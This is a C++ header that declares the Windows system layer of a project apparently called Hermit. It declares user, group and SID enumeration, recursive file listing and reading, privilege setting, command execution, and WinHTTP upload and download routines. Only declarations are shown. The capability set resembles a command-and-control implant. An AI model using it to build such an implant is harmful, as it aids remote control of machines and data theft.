#ifndef HERMIT_CORE_SYSTEM_HPP
#define HERMIT_CORE_SYSTEM_HPP

#include "core/state.hpp" // need to include it first to avoid winsock2.h and windows.h error
#include <windows.h>
#include <winhttp.h>
#include <winreg.h>
#include <fstream>
#include <lm.h>
#include <map>
#include <sddl.h>
#include <string>
#include <strsafe.h>
#include <synchapi.h>
#include <vector>

#include "core/procs.hpp"
#include "core/stdout.hpp"
#include "core/utils.hpp"

#define INFO_BUFFER_SIZE 32767

namespace System::Arch
{
    std::wstring GetName(WORD wProcessorArchitecture);
}

namespace System::Env
{
    std::wstring GetStrings(const std::wstring& envVar);
    std::map<std::wstring, std::wstring> GetAll();
}

namespace System::Fs
{
    VOID CALLBACK FileIOCompletionRoutine(
        DWORD dwErrorCode,
        DWORD dwNumberOfBytesTransfered,
        LPOVERLAPPED lpOverlapped
    );


    struct MyFileData {
    LPVOID lpData;
    DWORD dwDataSize;
    };

    std::wstring GetAbsolutePath(const std::wstring& wPath);
    std::vector<std::wstring> GetFilesInDirectory(const std::wstring& wDirPath, BOOL bRecurse);
    std::vector<BYTE> ReadBytesFromFile(const std::wstring& wFilePath);
    BOOL MyWriteFile(const std::wstring& wFilePath, LPCVOID lpData, DWORD dwDataSize);
}

namespace System::Group
{
    std::vector<std::wstring> GetAllGroups();
}

namespace System::Http
{
    struct WinHttpHandlers {
        HINTERNET hSession;
        HINTERNET hConnect;
    };

    struct WinHttpResponse {
        BOOL bResult;
        HINTERNET hRequest;
        DWORD dwStatusCode;
    };

    WinHttpHandlers InitRequest(
		Procs::PPROCS pProcs,
		LPCWSTR lpHost,
		INTERNET_PORT nPort
	);

    WinHttpResponse SendRequest(
        Procs::PPROCS pProcs,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpMethod,
        LPCWSTR lpHeaders,
        LPVOID lpData,
        DWORD dwDataLength
    );

    std::vector<BYTE> ReadResponseBytes(
        Procs::PPROCS pProcs,
        HINTERNET hRequest
    );

    std::wstring ReadResponseText(
        Procs::PPROCS pProcs,
        HINTERNET hRequest
    );

    BOOL DownloadFile(
        Procs::PPROCS pProcs,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpHeaders,
        const std::wstring& wSrc,
        const std::wstring& wDest
    );

    BOOL UploadFile(
        Procs::PPROCS pProcs,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpHeaders,
        const std::wstring& wSrc
    );
    
    VOID WinHttpCloseHandles(
        Procs::PPROCS pProcs,
        HINTERNET hSession,
        HINTERNET hConnect,
        HINTERNET hRequest
    );
}

namespace System::Priv
{
    BOOL CheckPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege);
    BOOL SetPrivilege(
        HANDLE hToken,
        LPCTSTR lpszPrivilege,
        BOOL bEnablePrivilege
    );
}

namespace System::Process
{
    std::wstring ExecuteCmd(const std::wstring& cmd);
    BOOL ExecuteFile(const std::wstring& filePath);
}

namespace System::User
{
    std::wstring GetAccountName(); // retrieves computer name and username.
    std::wstring GetSID();
    std::vector<std::wstring> GetAllUsers();
}

#endif // HERMIT_CORE_SYSTEM_HPP